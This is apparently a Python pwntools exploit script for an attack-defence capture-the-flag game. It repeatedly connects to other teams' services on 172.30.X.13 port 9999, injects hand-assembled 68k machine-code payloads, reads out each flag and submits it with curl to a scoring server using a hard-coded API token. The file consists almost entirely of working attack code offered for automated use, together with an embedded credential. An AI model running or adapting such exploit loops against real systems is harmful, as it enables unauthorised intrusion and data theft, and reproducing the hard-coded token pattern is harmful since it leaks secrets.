import sys
import os
from random import randrange
from pwn import *

OUR_TEAM = 14
TEST = 0

def submit_flag(team_number, flag):
    print '%d flag: %s' % (team_number, flag)
    if TEST == 0:
        os.system('curl http://10.66.20.15/api/v1/jad/web/submit_flag/?event_id=2 -d \'flag=%s&token=hEjrar35KXJkyjt4Bl7UyvAK3szuzU8hHAntVQVDftnDQ\'' % flag)

context.timeout = 1

while True:
    for team in [range(1, 21), range(OUR_TEAM, OUR_TEAM + 1)][TEST]:
        try:
            con = remote('172.30.%d.13' % team, 9999)
            if TEST == 0 and team == OUR_TEAM:
                con.close()
                continue

            # do not considnr overlap, just retry
            cnt = randrange(0, 0x1000)
            loc1 = randrange(0, 0x280)
            loc2 = randrange(0, 0x280)

            payload1 = ''
            payload1 += '\x06\x00\x00\x01' # addib #1, %d0
            payload1 += '\x0c\x40' + p16(cnt, endian='big') # cmpiw #cnt, %d0
            payload1 += '\x66\xf6' # bnes loc1
            payload1 += '\x4e\xf8' + p16(loc2, endian='big') # jmp loc2

            payload2 = ''
            payload2 += '\x4e\xf8' + p16(loc2, endian='big') # jmp loc2

            if loc1 < loc2:
                payload = payload1 + os.urandom(loc2 - (loc1 + len(payload1))) + payload2
            else:
                payload = payload2 + os.urandom(loc1 - (loc2 + len(payload2))) + payload1

            con.recvuntil('size > ')
            con.sendline(str(len(payload)))
            con.recvuntil('code > ')
            con.sendline(payload)
            con.recvuntil('loc > ')
            con.sendline(str(min(loc1, loc2)))
            con.recvuntil('[+] Run complete')
            flag = con.recvall(timeout=context.timeout).strip()
            con.close()
            if len(flag) > 0:
                submit_flag(team, flag)
        except Exception as e:
            print e

    sleep(2)
